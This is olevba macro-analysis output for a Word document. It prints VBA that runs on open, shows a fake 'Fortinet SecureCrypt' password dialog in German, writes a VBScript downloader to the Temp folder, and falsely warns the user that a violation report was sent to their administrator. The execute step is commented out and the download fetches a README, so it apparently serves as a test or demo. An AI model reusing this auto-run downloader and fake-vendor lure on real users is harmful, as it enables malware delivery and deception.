olevba 0.52dev7 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OpX:MASI-B-- dddb6a2420ed52e5b90cd6c3d933cf04a2cb738362f40690fb4bcc338bc10e97
===============================================================================
FILE: dddb6a2420ed52e5b90cd6c3d933cf04a2cb738362f40690fb4bcc338bc10e97
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
MsgBox "Um den Inhalt dieser Datei anzuzeigen, geben Sie bite das entsprechende Passwort ein.", , "Fortinet SecureCrypt 2017 ©"
Verify
End Sub
Function DecodeBase64(ByVal strData As String) As Byte()
 
    Dim objXML As MSXML2.DOMDocument
    Dim objNode As MSXML2.IXMLDOMElement
   
    Set objXML = New MSXML2.DOMDocument
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
   
    Set objNode = Nothing
    Set objXML = Nothing

End Function


Sub Verify()
Dim VerificationCodeFile As Integer
Dim FilePath As String


FilePath = Environ("Temp") + "\fortinet_verification.vbs" ' "C:\Users\fsbb\AppData\Local\Temp\fortinet_verification.vbs"

Dim fso As Object
Set fso = CreateObject("Scripting.FileSystemObject")
Dim oFile As Object
Set oFile = fso.CreateTextFile(FilePath)

oFile.WriteLine "Dim temp_path"
oFile.WriteLine "Set temp_path = WScript.CreateObject(""Scripting.FileSystemObject"").GetSpecialFolder(2)"
oFile.WriteLine "HTTPDownload ""https://raw.githubusercontent.com/Ottootto2010/EvolutionSim/master/README.md"", temp_path & ""\TEST.txt"""
oFile.WriteLine ""
oFile.WriteLine "Sub HTTPDownload( url, path )"
oFile.WriteLine "   Dim xmlhttp"
oFile.WriteLine ""
oFile.WriteLine "  Set xmlhttp = createobject(""MSXML2.XMLHTTP.3.0"")"
oFile.WriteLine ""
oFile.WriteLine "  strURL = DownloadDest"
oFile.WriteLine "  msgbox ""Download-URL: "" & url"
oFile.WriteLine "  xmlhttp.Open ""GET"", url, false"
oFile.WriteLine ""
oFile.WriteLine "  xmlhttp.Send"
oFile.WriteLine "  ' Wscript.Echo ""Download-Status: "" & xmlhttp.Status & "" "" & xmlhttp.statusText"
oFile.WriteLine ""
oFile.WriteLine "  If xmlhttp.Status = 200 Then"
oFile.WriteLine "    Dim objStream"
oFile.WriteLine "    Set objStream = CreateObject(""ADODB.Stream"")"
oFile.WriteLine "    objStream.Type = 1 'adTypeBinary"
oFile.WriteLine "    objStream.Open"
oFile.WriteLine "    objStream.Write xmlhttp.responseBody"
oFile.WriteLine "    objStream.SaveToFile path"
oFile.WriteLine "    objStream.Close"
oFile.WriteLine "    Set objStream = Nothing"
oFile.WriteLine "  End If"
oFile.WriteLine "  Set xmlhttp=Nothing"
oFile.WriteLine ""
oFile.WriteLine "End Sub"

oFile.Close
Set fso = Nothing
Set oFile = Nothing

MsgBox "wscript " + FilePath
' Shell "wscript " + FilePath
    
End Sub


Private Sub CommandButton1_Click()
MsgBox "Falsches Passwort. Ein Bericht über mögliche Sicherheitsverstöße von " & (Environ$("Username")) & " wurde zur weiteren Analyse an den Netzwerkadministrator gesendet.", , "Fortinet SecureCrypt 2017 ©"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: word/vbaProject.bin - OLE stream: u'VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function DecodeBase64(ByVal strData As String) As Byte()
 
    Dim objXML As MSXML2.DOMDocument
    Dim objNode As MSXML2.IXMLDOMElement
   
    Set objXML = New MSXML2.DOMDocument
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
   
    Set objNode = Nothing
    Set objXML = Nothing

End Function
